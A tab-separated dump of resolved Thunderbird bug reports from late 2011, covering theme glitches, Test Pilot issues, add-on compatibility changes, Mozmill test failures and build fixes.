712312%TAB%1324364201%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Troubleshooting Information broken due to missing aboutSupport.showWin.label string%TAB%Troubleshooting Information broken due to missing aboutSupport.showWin.label stringUpon opening Troubleshooting Information, we see the following error:  XML Parsing Error: undefined entity Location: file:///c:/Users/mconley/mozilla/obj-tb-tot/mozilla/dist/bin/chrome/messenger/content/messenger/about-support/aboutSupport.xhtml Line Number 144, Column 19:                  &aboutSupport.showWin.label; ------------------^  This looks like fallout from bug 413521, and is causing Mozmill test failures in content-tabs/test-about-support.js.  This bug seems to affect both Windows and Linux.  OSX is not affected.
712285%TAB%1324358452%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%(tabs on top) throbber very close to edge%TAB%(tabs on top) throbber very close to edgeFollowup to bug #644169 (comment 155). Siddharth noted that the throbber in the tab is very close to the edge of the tab.
712159%TAB%1324306187%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Line between window title bar and toolbar in standalone window%TAB%Line between window title bar and toolbar in standalone windowI think this is restricted to the tabs on top patch (bug #644169) There seems to be a line between the window title bar and the toolbar when you open a message in a new window. It seems that the only thing I can see differ between standalone window and and the 3pane window is the nodeName mail:messageWindow vs. mail:3pane.  I tried to select this with: window[windowtype=mail:messageWindow] .mail-toolbox {   -moz-appearance: toolbox; }  The css parser did not enjoy that at all. Then again, it's 3:30 in the morning, so I might be missing something  
711968%TAB%1324272637%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Buttons in Account Provisioner do not wrap long text%TAB%Buttons in Account Provisioner do not wrap long textThe text inside the Account Provisioner buttons is not wrapped for long text.
711750%TAB%1324121394%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%[10.7]  Finalize Lion fullscreen support in Thunderbird,Implement a fullscreen arrow for some windows in Thunderbird for 10.7 and above%TAB%[10.7]  Finalize Lion fullscreen support in Thunderbird,Implement a fullscreen arrow for some windows in Thunderbird for 10.7 and aboveIf Bug 639705 is fixed, we will have the Lion fullscreen arrow on every window in Thunderbird. This than works to bring this window into Lion fullscreen mode on 10.7. But the shortcut and some other things doesn't work. So we need to port the necessary parts from browser.js to Thunderbird.
711085%TAB%1323934077%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Attachment tests are never run as part of mozmilltests.list, and are broken%TAB%Attachment tests are never run as part of mozmilltests.list, and are brokenFunny story:  it looks like we've never run the attachment tests as part of mozmilltests.list.  That's not good.  Even worse, when I ran the attachment tests, a bunch of them in test-attachment-menus.js failed.  I've got a fix for this - I'll post it up soon.
710912%TAB%1323873313%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test_can_pref_off_account_provisioner,Permanent orange on Linux: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test_can_pref_off_account_provisioner%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test_can_pref_off_account_provisioner,Permanent orange on Linux: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test_can_pref_off_account_provisionerThis is fallout from bug 700536.  I thought I'd fixed this - I've had one try build pass these tests just fine.  :/  Anyhow, here's the log:  SUMMARY-UNEXPECTED-FAIL | test-newmailaccount.js | test-newmailaccount.js::test_can_pref_off_account_provisioner   EXCEPTION: Popup did not close!     at: utils.js line 429        TimeoutError("Popup did not close!") utils.js 429        waitFor((function () elem.state == "closed"),"Popup did not close!",1000,50) utils.js 467        close_popup([object Object],[object Object]) test-folder-display-helpers.js 1405        test_can_pref_off_account_provisioner() test-newmailaccount.js 834             frame.js 557             frame.js 626             frame.js 669             frame.js 497             frame.js 675             server.js 179             server.js 183
710867%TAB%1323865308%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Make inactive tabs opaque under Aero%TAB%Make inactive tabs opaque under AeroBase on this screenshot <http://dl.dropbox.com/u/2301433/Screenshots/TabsOnTop/4-Gloda.png>, inactive tabs are translucent. We should follow Firefox's lead in this case and make them opaque, so no one can complain about there being too much glass.
710838%TAB%1323861737%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Certain dark Personas make it hard to read the selected tab title%TAB%Certain dark Personas make it hard to read the selected tab titleIn the attached screenshot, a Three Wolf Moon Persona is making it difficult to read the Inbox tab title text.  We should make this much easier to read.
710831%TAB%1323860963%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Tab selector does not blend well with Gloda search pane or mail header%TAB%Tab selector does not blend well with Gloda search pane or mail headerThere is a slight discolouration from the tab selector to the tab content for both the Gloda search panes, as well as the message header, when viewing an individual message.  Proposed solutions:  1)  Have the message header use a gradient to transition smoothly from the tab selector.  This is fine if this persists in the normal 3pane view...it might actually look kind of nice.  2)  The right half of the Gloda search pane (the big white chunk) could also stand to be transitioned with a gradient.
710813%TAB%1323858852%TAB%352356%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%Tools | Add-ons | Test Pilot Options popping up a very small non functional window%TAB%Tools | Add-ons | Test Pilot Options popping up a very small non functional windowFiling bug as per Standard8's request.  On TB9Beta4  Steps to Reproduce: 1. Test Pilot Options (Tools | Add-ons | Test Pilot Options )  RESULT: pops up a very small non functional window with title "Problem loading"
710056%TAB%1323703486%TAB%269762%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Earlybird doesn't remember columns change in the message list after restart,Earlybird doesn't remember columns change in the message list after restart (only after restart of Tb which is automatically initiated when an update is applied by Help/About/Apply Update)%TAB%Earlybird doesn't remember columns change in the message list after restart,Earlybird doesn't remember columns change in the message list after restart (only after restart of Tb which is automatically initiated when an update is applied by Help/About/Apply Update)Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0a2) Gecko/20111212 Thunderbird/10.0a2  STR: - change the columns to display in Inbox (see bellow for details) - optionally, sync them between other folders - restart -> folders are back as before  Details: I want to have the following columns (ordered): Thread, Attachment, From, Subject, Read, Starred, Date, Junk Status  I always get back the following: Thread, Attachment, From, Subject, Recipient, Size, Starred, Date, Junk Status  (Read is altered with Recipient + Size)  The profile is very old, could that be some artifact breaking this?  It started to happen (or, I started to notice) some week ago after the columns broke (was set to "I always get back the following" list after restart).   I can try to bisect the changeset if this is not known.
709799%TAB%1323674796%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%monochrome toolbar icons to match Lion%TAB%monochrome toolbar icons to match LionIt seems I didn't open a bug about it this already (as far as I can remember). Given the fact that Lion very much has a monochrome icons everywhere, I think we should do this too, more specifically for the toolbar. The folder view could get some love too, but that's another bug.
709737%TAB%1323651878%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Test Pilot notifications don't work%TAB%Test Pilot notifications don't workHaving taken part in the test study on the development channel, the study is now complete, but I haven't been prompted to submit my data.  The error console says:  Error: popup is null Source File: resource://testpilot/modules/notifications.js Line: 103  Looks like as we removed the feedback button, we've not got a notification option. Is there somewhere else we could hang this from?
709717%TAB%1323645760%TAB%25926%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Send the compatibility mode when using AMO Search API%TAB%Send the compatibility mode when using AMO Search APIFor search, AMO sends addons that it thinks are compatible. We also do some checking client side, but those checks are redundant because of the server-side checked.  So we need to tell AMO how the client is determining compatibility, much like we do with the update pings.  This bug is about porting bug 706387 from FF, ideally in one go for TB and SM like done in bug 707225. I'll come up with a patch later today unless someone else is faster.
709273%TAB%1323434422%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Test Pilot Week in the Life study doesn't seem to monitor Thunderbird's memory%TAB%Test Pilot Week in the Life study doesn't seem to monitor Thunderbird's memoryLooking at the more info section of the "Week in the Life" study, Thunderbird isn't listing showing anything about the memory usage.  The "Click here to see a display of all the collected data in its raw form, exactly as it will be sent." doesn't seem to detail any memory information either.
709270%TAB%1323434231%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Test-pilot's More Info on Study tab links open wrong%TAB%Test-pilot's More Info on Study tab links open wrongSelect More info on a study in test pilot, then select a link - most of the links that are meant to open a page open in the compose window.  I think for now, we can either open them in a content tab or in the external browser.
708982%TAB%1323388119%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Provide listenable events for attachment operations in the compose window%TAB%Provide listenable events for attachment operations in the compose windowWith the "BigFiles" feature coming soon, we'll have two separate things listening for attachments being added or removed (the other is the attachment reminder). Instead of putting more special-purpose calls in the attachment manipulation functions, we should just use the observer service and send out some appropriate notifications. Here's what I'm thinking:  * attachmentAdded: fired when a single attachment is added (passes in the new attachment) * attachmentRemoved: fired when a single attachment is removed (passes in the   ex-attachment) * attachmentBatchAdded: fired when a group of attachments are added (e.g. if you add 3   attachments from a file picker) * attachmentBatchRemoved: fired when a group of attachments are deleted (e.g. if you   delete 3 attachments at once) * attachmentRenamed: fired when an attachment is renamed  Thus, if you attach 3 files at once from the file picker, it calls attachmentAdded three times, and then attachmentBatchAdded once.  This would be less invasive, so we could put BigFiles and the attachment reminder in separate .js files, and for the attachment reminder, we could make it more efficient (currently it listens for every attachment added, when it could listen for attachmentBatchAdded). It would also open up the possibility for add-ons to do fun and exciting things with this information as well!
708702%TAB%1323335362%TAB%219124%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Use defaultPrevented instead of the deprecated getPreventDefault() in front-end code%TAB%Use defaultPrevented instead of the deprecated getPreventDefault() in front-end codeevent.getPreventDefault is deprecated, event.defaultPrevented should be used instead.  Affected files:  http://mxr.mozilla.org/comm-central/search?string=getPreventDefault&case=1&find=%2Fmail%2F&findi=&filter=^[^\0]*%24&hitlimit=&tree=comm-central
708315%TAB%1323250958%TAB%29811%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%"bundle is not defined" folderPane.js" line: 2203,virtual search folder can't be deleted ("bundle is not defined" folderPane.js" line: 2203)%TAB%"bundle is not defined" folderPane.js" line: 2203,virtual search folder can't be deleted ("bundle is not defined" folderPane.js" line: 2203)from Bug 265540  Error: An error occurred executing the cmd_delete command: [Exception... "'[JavaScript Error: "bundle is not defined" {file: "chrome://messenger/content/folderPane.js" line: 2203}]' when calling method: [nsIController::doCommand]"  nsresult: "0x80570021 (NS_ERROR_XPC_JAVASCRIPT_ERROR_WITH_DETAILS)"  location: "JS frame :: chrome://global/content/globalOverlay.js :: goDoCommand :: line 96"  data: yes] Source File: chrome://global/content/globalOverlay.js Line: 100
707992%TAB%1323164219%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Upgrade to virtualenv 1.7 for mozmill tests%TAB%Upgrade to virtualenv 1.7 for mozmill testsLpSolit, this might fix the issue you were having with building tests on Thunderbird. You might want to try building in mail/test/mozmill with this patch applied.  This should be rs=Standard8. There's one change: since --no-site-packages has been made the default and the option deprecated, I've removed it.
707792%TAB%1323085432%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Port bug 549561 to Thunderbird to speed up mailbloat tests%TAB%Port bug 549561 to Thunderbird to speed up mailbloat tests noticed bug 549561 today. By making some changes in trace malloc, they speeded up the time to run the tests.  I've just made a similar modification and pushed to try server - the make mailbloat step on windows dropped from about 2 hours to 2 minutes.  The patch does this by picking up the environment that's defined by automation.py.in (which also picks up the global environment specified by buildbot), and in doing so we gain the NS_TRACE_MALLOC_DISABLE_STACKS preference which is what Firefox has done for its leak test builds.  This modifies the stackwalking in tracemalloc for things we don't need to do unless there's actually issues.  Try server runs all passed with this applied.
707443%TAB%1322899261%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Disability Access%TAB%missing accesskey for "Recently Closed tabs" menu item%TAB%missing accesskey for "Recently Closed tabs" menu item(as seen on Mozilla/5.0 (X11; Linux i686; rv:11.0a1) Gecko/20111203 Thunderbird/11.0a1) There is no accesskey for Go > Recently Closed Tabs menu item
707329%TAB%1322833672%TAB%235025%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Folder panel has no content,Folder panel has no content. JSON.parse: unexpected end of data Source File: chrome://messenger/content/folderPane.js%TAB%Folder panel has no content,Folder panel has no content. JSON.parse: unexpected end of data Source File: chrome://messenger/content/folderPane.jsUser Agent: Mozilla/5.0 (Ubuntu; X11; Linux x86_64; rv:10.0a2) Gecko/20111202 Firefox/10.0a2 Build ID: 20111202052423  Steps to reproduce:  After (updating and) starting Beta version of Thunderbird 9   Actual results:  The folder panel is empty, nothing appear at that place. I tried to resize the window of TB, move the slide between folder panel and message panel. It is working but I haven't got any content in folder panel. I tried also the safe-mode and disabling extension.  I have working client, I can write a new letter, receive mails, etc. But I cant open addo-ons tab.  The screenshot: http://kepfeltoltes.hu/111202/thunderbird9problem_www.kepfeltoltes.hu_.png  I have Ubuntu 11.10 and Thunderbird 9 Beta from thunderbird-next ppa   Expected results:  Folder should be viewable on folder panel
707225%TAB%1322818857%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Addon update check should take into account compatibility preferences%TAB%Addon update check should take into account compatibility preferencesJust like FF have done in bug 527141, we should pass the new compatibility check parameter to AMO in our searches for add-ons. Then AMO can take account of what to give us when searching for add-ons.
707122%TAB%1322793291%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Fix packaging of msvc dlls (add support for 2011, remove others if necessary on upgrade)%TAB%Fix packaging of msvc dlls (add support for 2011, remove others if necessary on upgrade)There's been a few bugs around recently on implementing MSVC 2011 support, and also fixing up removed-files.in.  This is just a bulk update for Thunderbird - support packaging the 2011 dlls, and make sure we remove the old ones when we upgrade. We'll need this later if we upgrade our complier version.  Note these haven't got @BINPATH@ in removed-files.in as that's wrong, see bug 707121.
707105%TAB%1322787705%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Near-perma-orange: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test-newmailaccount.js::test_get_an_account%TAB%Near-perma-orange: TEST-UNEXPECTED-FAIL | test-newmailaccount.js | test-newmailaccount.js::test_get_an_accountWe've got a new near-permanent orange in comm-central:  TEST-START | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\newmailaccount\test-newmailaccount.js | test_get_an_account Step Pass: {"function": "controller.click()"} Step Pass: {"function": "controller.waitFor()"} Step Pass: {"function": "controller.waitFor()"} Test Failure: waitFor: Timeout exceeded for 'function () $("#results").children().length > 0' TEST-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\newmailaccount\test-newmailaccount.js | test-newmailaccount.js::test_get_an_account TEST-START | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\newmailaccount\test-newmailaccount.js | teardownModule TEST-PASS | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\newmailaccount\test-newmailaccount.js | test-newmailaccount.js::teardownModule INFO Passed: 2 INFO Failed: 1 INFO Skipped: 0 ##### MOZMILL-RICH-FAILURES-BEGIN ##### ... ##### MOZMILL-RICH-FAILURES-END ##### SUMMARY-PASS | test-newmailaccount.js::setupModule SUMMARY-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\newmailaccount\test-newmailaccount.js | test-newmailaccount.js::test_get_an_account   EXCEPTION: waitFor: Timeout exceeded for 'function () $("#results").children().length > 0'     at: utils.js line 429        TimeoutError("waitFor: Timeout exceeded for 'function () $(\"#results\").children().length > 0'") utils.js 429        waitFor((function () $("#results").children().length > 0),"waitFor: Timeout exceeded for 'function () $(\"#results\").children().length > 0'",5000,100,(void 0)) utils.js 467             controller.js 648        test_get_an_account() test-newmailaccount.js 126             frame.js 557             frame.js 626             frame.js 669             frame.js 497             frame.js 675             server.js 179             server.js 183 SUMMARY-PASS | test-newmailaccount.js::teardownModule  Seemed to start around:  http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=1900e3edd32d&tochange=66a1db693790  Only really seen on windows so far.  Mike, can you take a look please?
706905%TAB%1322733775%TAB%269762%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%[build failed] LDAP C SDK with pymake on windows - ldap/sdks should update to changeset 2da94bd1028c%TAB%[build failed] LDAP C SDK with pymake on windows - ldap/sdks should update to changeset 2da94bd1028cSTR: - clone comm-central - python client.py checkout - .mozconfig: ac_add_options --enable-application=mail  - pymake -f client.mk build  > make.py[4]: Entering directory 'f:\mozilla\comm-central\obj-i686-pc-mingw32\mozilla\./../ldap/sdks/c-sdk' No target specified and no default target found.  Updating ldap/sdks to 2da94bd1028c makes building work again.  Please update client.py to do this automatically.
706798%TAB%1322711800%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%'Tune' the time to wait before displaying the update been downloaded / restart notification and provide ability to override in the update xml (port from Firefox),'Tune' the time to wait before displaying the update been downloaded / restart notification%TAB%'Tune' the time to wait before displaying the update been downloaded / restart notification and provide ability to override in the update xml (port from Firefox),'Tune' the time to wait before displaying the update been downloaded / restart notificationFirefox altered the values for prompting users about updates, I think we should do the same.
706797%TAB%1322711654%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Make AddonRepository.getAddonsByIDs() not send performance data%TAB%Make AddonRepository.getAddonsByIDs() not send performance dataCurrently, the AddonRepository APIs for searching (specifically getAddonsByIDs()) automatically send performance metrics to the server.  Per discussion in bug 534956 (implementing add-on sync), having Sync query these APIs will have the undesired effect of skewing the metrics data.  AddonRepository.getAddonsByIDs() should be modified so that it optionally doesn't send performance data as part of the request and Sync can call it without skewing metrics data.  The attached patch adds an argument to getAddonsByIDs() to control sending of performance data. Patch notes:  * I purposefully made the API backwards compatible. Typically callbacks are passed last. I didn't want to go down the refactor hole. * Note that the lack of an argument defaults to a true value. * Is the '=== undefined' a suitable replacement for checking the length of the arguments pseudo-array? * I still need to write the additional tests.
706796%TAB%1322711561%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Addons that haven't been updated for an extremely long time should not be compatible by default%TAB%Addons that haven't been updated for an extremely long time should not be compatible by defaultJust like Firefox have done in bug 700201 we should provide a default minimum version that add-ons older than that won't be compatible for.  Firefox have put this at FF 4 / Gecko 2. I'm proposing we do TB 5 (and still gecko 2). This was the release after 3.1 and had all the extension manager rework, and component registration changes that FF 4 had. Therefore I think it is a sensible baseline.  We'll want this on both trunk & aurora as both of those have the possibility to turn off strict checking.
706794%TAB%1322710986%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Add extensions.strictCompatibility pref to Thunderbird to make addons compatible-by-default%TAB%Add extensions.strictCompatibility pref to Thunderbird to make addons compatible-by-defaultFirefox have done this on trunk builds, and I think we should do the same to help testing and get our confidence up.  We should also add the pref on aurora but set to disable add-ons by default, so we have the pref there should it need to be flipped, or testers want to flip it.
705808%TAB%1322475782%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%TestPilot first-run tab should not open if profile has no accounts in it.,TestPilot first-run tab shouldn't open for Thunderbird%TAB%TestPilot first-run tab should not open if profile has no accounts in it.,TestPilot first-run tab shouldn't open for ThunderbirdWe noticed this one in bug 700536 - the Account Provisioner modal dialog would block the 3pane, and if the user decided to order an account, the modal would close, the order form tab would open, and then the TestPilot tab would open and steal focus.  Our solution for now is to not open the TestPilot tab unless there are one or more accounts associated with the current profile. If not, we hold off on opening it until next time Thunderbird starts with 1 or more accounts.
705660%TAB%1322460434%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%OpenSearch tab looks weird with some Personas%TAB%OpenSearch tab looks weird with some PersonasMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0a2) Gecko/20111125 Thunderbird/10.0a2  I've got this Persona enabled:  http://www.getpersonas.com/en-US/persona/23285  And the sidebar in my OpenSearch tab looks kinda funky.
705649%TAB%1322456120%TAB%430493%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%vcard editor/ form showing blank%TAB%vcard editor/ form showing blankUser Agent: Mozilla/5.0 (X11; Linux x86_64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1 Build ID: 20111122085954  Steps to reproduce:  1. Go to "Edit" menu 2. Select "Account Settings..." 3. Select a preconfigured mail account 4. Select "Edit Card" 5. Type in some data, close 6. Reopen the vCard dialog, close 7. Send mail with attached vCard   Actual results:  The vCard form is empty, even after editing and saving. When checking about:config the data is there (maybe malformed?). When attached to a mail the vCard is empty.   Expected results:  The vCard form should load the data previously typed in. The vCard should be attached to a mail with actual data in it.
705462%TAB%1322299471%TAB%275144%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%[autoconfiguration] Setting my mozilla account through the "Mail Account Setup" does not find up the configuration%TAB%[autoconfiguration] Setting my mozilla account through the "Mail Account Setup" does not find up the configurationI installed Daily (Mac OS X 10.7 20111126 build) and I tried to add my @mozilla.com account but it says "Looking up configuration: Email provider" for-e-ver.  I can stop it and set it up manually but I thought I would let you know.
705431%TAB%1322285251%TAB%52340%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%make handling of attachments with missing or broken filenames more robust,make sure a MIME part with content-disposition: attachment is displayed as an attachment nonetheless even though it doesn't have a filename%TAB%make handling of attachments with missing or broken filenames more robust,make sure a MIME part with content-disposition: attachment is displayed as an attachment nonetheless even though it doesn't have a filenameThunderbird tries to extract filename information from Content-Dispositon.  When this fails (either because the filename parameter is missing, or because parsing the header failed), it should still display the attachment.
705381%TAB%1322229143%TAB%8558%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Tab blend into the rest making things look odd%TAB%Tab blend into the rest making things look oddThis in on Linux (Gtk) in Thunderbird 8. On Fedora 16, using the default theming.  The tab blends into the rest of the UI including the folder pane, making things look odd. See the screenshot (I circled in red) Also the tab label make us think this is part of the folder pane.  The solution would be to add a thin space between the tabs and the actual panes.
704830%TAB%1322030950%TAB%420324%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%Missing file at run time: chrome/messenger/content/messenger/webSearch.js%TAB%Missing file at run time: chrome/messenger/content/messenger/webSearch.jsShortly after start up, Trunk displays the message:  Chrome file doesn't exist: /Users/ireid/tbird/objdir-comm-central-default/mozilla/dist/DailyDebug.app/Contents/MacOS/chrome/messenger/content/messenger/webSearch.js  The reference to this file is in webSearchTab.xul
704451%TAB%1321931170%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Switching to unread filter hides all my email%TAB%Switching to unread filter hides all my emailSTR :  1) Open your bugmail folder ( View Threads with unread is my choice) 2) Select the unread button on the QFB  All unread messages that were visible are no more visible.  I see Error: uncaught exception: [Exception... "Component returned failure code: 0x80004001 (NS_ERROR_NOT_IMPLEMENTED) [nsIMsgDBView.numMsgsInView]"  nsresult: "0x80004001 (NS_ERROR_NOT_IMPLEMENTED)"  location: "JS frame :: resource:///modules/dbViewWrapper.js :: DBViewWrapper__applyViewChanges :: line 1388"  data: no] in the error console.
704436%TAB%1321919588%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%"Get next N news messages" never works%TAB%"Get next N news messages" never worksI feel like I've seen another bug on this, but I couldn't find one, so maybe I'm imagining things. Anyway, there's a typo in IsGetNextNMessagesEnabled() that prevents the "Get next N news messages" from functioning. Attached is the fix, with no tests, since it's a one-character change.
704234%TAB%1321872010%TAB%40471%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%remove the update channel reference from the about page when updater is not available%TAB%remove the update channel reference from the about page when updater is not availableRemove some text from the about box as Firefox did with bug 679324 when no updater is available anyway.
703232%TAB%1321496065%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Release Engineering,Build Config%TAB%Clean up mozconfigs a bit (port bug 575283),Clean up mozconfigs a bit (port bug 575283), remove some default options, enable signmar testing, and disable auto deps on Windows nightly builds%TAB%Clean up mozconfigs a bit (port bug 575283),Clean up mozconfigs a bit (port bug 575283), remove some default options, enable signmar testing, and disable auto deps on Windows nightly buildsBug 575283 did a whole load of cleanup in mozconfigs to remove default options.  I'd like to do that for us as well, before we do bug 685166 (then it doesn't need doing in two different places).  However, for now I'm just doing the comm-central files - we can port the changes across as we go through the merge processes.
702349%TAB%1321264692%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%On Mac the background of the individual test pilot studies is transparent%TAB%On Mac the background of the individual test pilot studies is transparentOn Mac, if you have a test pilot study listed, and you view the details of the study, you get a page with a transparent background.  We need to fix this before shipping test pilot.  Mike, could you take a look at this please?
702209%TAB%1321230939%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Disable feedback buttons in Tools -> Feedback menu for now,[testpilot] Disable feedback buttons in Tools -> Feedback menu for now%TAB%Disable feedback buttons in Tools -> Feedback menu for now,[testpilot] Disable feedback buttons in Tools -> Feedback menu for nowUntil we get feedback working, we're not ready for feedback buttons with Thunderbird's test pilot. Just like bug 700947, we should disable the ones accessible via the menu.  The menu name will seem a bit strange for now, but that'll get corrected when we can add feedback back in.
702201%TAB%1321224178%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Clicking the "Delete" toolbar button with an attachment focused should delete the message, not the attachment%TAB%Clicking the "Delete" toolbar button with an attachment focused should delete the message, not the attachmentIt turns out that the "delete" toolbar button issues the same command as the "delete" key on the keyboard, so hitting the "delete" toolbar button tries to delete an attachment if it's selected/focused. We should issue a different command for the button to tell these apart. Here's a patch to do this. The patch also removes some dead code that tries to disable the delete button for news messages, on the assumption that "delete" = "cancel" in news.  Since this is technically a change in the UX, I'm also requesting UI review on it.
702137%TAB%1321179379%TAB%373508%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%genericPhotoHandler saves wrong photoname%TAB%genericPhotoHandler saves wrong photonameUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20111104165243  Steps to reproduce:  the onSave method of onSave of genericPhotoHandler in abCardOverlay.js has the statement "aCard.setProperty("PhotoName", null);". this actually stores the string "null" in the card, which is wrong. the statemant should be "aCard.setProperty("PhotoName", "");". additionally it should also clear the photoURI: "aCard.setProperty("PhotoName", null);"
702094%TAB%1321143220%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Dragging attachments from the compose window doesn't work anymore%TAB%Dragging attachments from the compose window doesn't work anymoreBug 630759 broke this because I forgot to update a string in MsgComposeCommands.js. Here's the fix. I could write tests for this, but inter-window drag-and-drop tests are fairly complicated, so I'm going to avoid doing it unless specifically requested.
702086%TAB%1321135729%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Don't throw when version is null in specialTabs.splitVersion%TAB%Don't throw when version is null in specialTabs.splitVersionThere are probably a bunch of problems caused by this, but the most obvious one (to me) is that the OpenSearch tab type doesn't get registered on first-run of a Thunderbird installation.
701828%TAB%1321011967%TAB%429455%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Spell check does not work in Thunderbird 8.0%TAB%Spell check does not work in Thunderbird 8.0User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928134238  Steps to reproduce:  Spell check doesn't work in version 8.0. I did nothing to cause this, it was a "standard" installation.   Actual results:  The dialog box for it comes up everytime an e-mail is sent, even when everything is correctly spelled & it takes two clicks to close it. When a word is misspelled, it doesn't underline it & it "spelling" is clicked, the dialog box is empty.   Expected results:  It should have underlined the misspelled word & offered replacements with correct spelling. It should not have opened the spell check box when all spelling is correct.
701671%TAB%1320983670%TAB%138192%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Entity messengerWindow.title seems not to be used in Thunderbird%TAB%Entity messengerWindow.title seems not to be used in ThunderbirdIn messenger.dtd the first entity is: <!ENTITY messengerWindow.title "Mail &amp; Newsgroups">  This entity seems not to be used in Thunderbird. So we could remove it.
701016%TAB%1320820148%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Remove hard-coded "Free" string, and add plural form support in Account Provisioner%TAB%Remove hard-coded "Free" string, and add plural form support in Account ProvisionerFrom RQ:  "# LOCALIZATION NOTE (more): #   %S will be the number of email addresses minus two.  (So, we'll show #   two, and say that there are "(n-2) more…" more=+%S more…  Would it be possible to make this line support plural forms?  Also, the word "Free" in the table header for e.g. AOL, is not localizable. Please make it such."
